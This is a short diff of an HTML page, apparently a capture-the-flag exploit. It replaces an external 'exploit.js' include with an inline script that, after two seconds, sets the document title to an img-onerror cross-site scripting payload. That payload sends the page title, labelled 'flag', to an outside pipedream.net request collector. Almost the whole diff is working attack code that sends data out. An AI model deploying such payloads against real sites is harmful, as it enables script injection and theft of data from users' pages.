@@ -3,9 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <title>Initial Title</title>
-    <script src="exploit.js"></script>
+<!--     <script src="exploit.js"></script> -->
+    <script>
+        setTimeout(function() {
+            document.title = `<img src=x onerror="var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://enuhsfb8x1ni.x.pipedream.net/?flag=' + encodeURIComponent(document.title), true); xhr.send();">`;
+        }, 2000);
+    </script>
 </head>
     <body>
-        <h1>Page title will change in 2 seconds (check the tab's title).</h1>
+        <h1>Page title will change in 2 seconds.</h1>
     </body>
 </html>
